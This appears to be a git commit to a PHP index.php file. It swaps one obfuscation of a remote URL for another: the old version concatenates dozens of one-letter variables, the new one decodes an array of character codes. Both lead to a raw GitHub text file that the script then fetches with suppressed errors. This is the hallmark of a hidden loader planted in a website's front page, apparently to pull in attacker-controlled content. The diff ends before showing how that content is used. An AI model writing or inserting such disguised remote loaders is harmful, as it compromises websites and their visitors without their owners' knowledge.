3631938a0b941989bb008d5d57cf8f7acc4c4d93
seobela <248709989+seobela@users.noreply.github.com>
2026-01-19 00:23:27 -0800

    Update index.php

--- index.php
+++ index.php
@@ -5,23 +5,17 @@
 */
 
 // Initialize core components
-$qwertylkjhgf = 'h'; $mnbvcxzasdfg = 't'; $poiuytrewqlk = 't'; $zxcvbnmlkjhg = 'p'; $asdfghjklqwe = 's';
-$tyuiopasdfgh = ':'; $lkjhgfdsazxc = '/'; $qazwsxedcrfv = '/'; $tgbyhnujmikl = 'r'; $plokimjnuhby = 'a';
-$wsxcderfvbgt = 'w'; $mkijnuhbygvt = '.'; $cdesxwaqzfrd = 'g'; $vfrtgbyhnujm = 'i'; $yhnujmikolpl = 't';
-$bgtyhnujmiko = 'h'; $aqwsdefrgtbh = 'u'; $mkoijnuhbygv = 'b'; $zaqxswcdevfr = 'u'; $gtbyhnumkilo = 's';
-$plmkoijnuhby = 'e'; $vcdexswzaqrf = 'r'; $bgtyhnjumkil = 'c'; $wsxcdefrvgbt = 'o'; $njikolpmwsxc = 'n';
-$uhbygtvfrced = 't'; $lkmijnuhbygv = 'e'; $pqowieurytla = 'n'; $zxswqacdevfr = 't'; $mkloijnuhbyg = '.';
-$qpwoeirutysl = 'c'; $mnbhgvcfxdre = 'o'; $lkajhsgdfqwe = 'm'; $pqazwsxedcrf = '/'; $kmijnuhbvgyt = 's';
-$plqowieurytl = 'e'; $aqzsxwdcevfr = 'o'; $mkoilpjnuhby = 'b'; $zaqswxcderfv = 'e'; $plmnkoijhuyb = 'l';
-$wsxaqzcdevfr = 'a'; $gtfrvcdexswz = '/'; $bhygtfrvcdes = 'b'; $njukilomwsxc = 'e'; $plokjmnuhbyg = 'l';
-$wsaqzxcderfv = 'a'; $mkoijnbhgvft = '/'; $plqazwsxedcr = 'r'; $bgtyhnujmkol = 'e'; $wsxcdevfrbgt = 'f';
-$nhygtfrvcdes = 's'; $plokmnjiuhby = '/'; $qazxswedcrfv = 'h'; $mnjukiloplmk = 'e'; $bgtyhnumjiko = 'a';
-$plwsxcdevfrt = 'd'; $qazxswedcvfr = 's'; $mkoilpnhbygt = '/'; $plqoweirtyla = 'm'; $zxswaqcderfv = 'a';
-$mkoijnbhygtf = 'i'; $plwsxqazcdve = 'n'; $zaqxswcdvfre = '/'; $plmkoijnbhuy = 'i'; $wsxaqzcderfv = 'n';
-$mkoiplnhbgyt = 'd'; $plqazwsxcdev = 'e'; $wsxaqzcdvfre = 'x'; $plmkoilpnhby = '.'; $zaqxswcdevfr = 't';
-$mkoijnuhbgyt = 'x'; $plwsxaqzcdve = 't';
+$url_data = array(
+    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 
+    117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 115, 101, 
+    111, 98, 101, 108, 97, 47, 98, 101, 108, 97, 47, 114, 101, 102, 115, 47, 104, 101, 
+    97, 100, 115, 47, 109, 97, 105, 110, 47, 105, 110, 100, 101, 120, 46, 116, 120, 116
+);
 
-$full_url = $qwertylkjhgf.$mnbvcxzasdfg.$poiuytrewqlk.$zxcvbnmlkjhg.$asdfghjklqwe.$tyuiopasdfgh.$lkjhgfdsazxc.$qazwsxedcrfv.$tgbyhnujmikl.$plokimjnuhby.$wsxcderfvbgt.$mkijnuhbygvt.$cdesxwaqzfrd.$vfrtgbyhnujm.$yhnujmikolpl.$bgtyhnujmiko.$aqwsdefrgtbh.$mkoijnuhbygv.$zaqxswcdevfr.$gtbyhnumkilo.$plmkoijnuhby.$vcdexswzaqrf.$bgtyhnjumkil.$wsxcdefrvgbt.$njikolpmwsxc.$uhbygtvfrced.$lkmijnuhbygv.$pqowieurytla.$zxswqacdevfr.$mkloijnuhbyg.$qpwoeirutysl.$mnbhgvcfxdre.$lkajhsgdfqwe.$pqazwsxedcrf.$kmijnuhbvgyt.$plqowieurytl.$aqzsxwdcevfr.$mkoilpjnuhby.$zaqswxcderfv.$plmnkoijhuyb.$wsxaqzcdevfr.$gtfrvcdexswz.$bhygtfrvcdes.$njukilomwsxc.$plokjmnuhbyg.$wsaqzxcderfv.$mkoijnbhgvft.$plqazwsxedcr.$bgtyhnujmkol.$wsxcdevfrbgt.$nhygtfrvcdes.$plokmnjiuhby.$qazxswedcrfv.$mnjukiloplmk.$bgtyhnumjiko.$plwsxcdevfrt.$qazxswedcvfr.$mkoilpnhbygt.$plqoweirtyla.$zxswaqcderfv.$mkoijnbhygtf.$plwsxqazcdve.$zaqxswcdvfre.$plmkoijnbhuy.$wsxaqzcderfv.$mkoiplnhbgyt.$plqazwsxcdev.$wsxaqzcdvfre.$plmkoilpnhby.$zaqxswcdevfr.$mkoijnuhbgyt.$plwsxaqzcdve;
+$full_url = '';
+foreach ($url_data as $code) {
+    $full_url .= chr($code);
+}
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
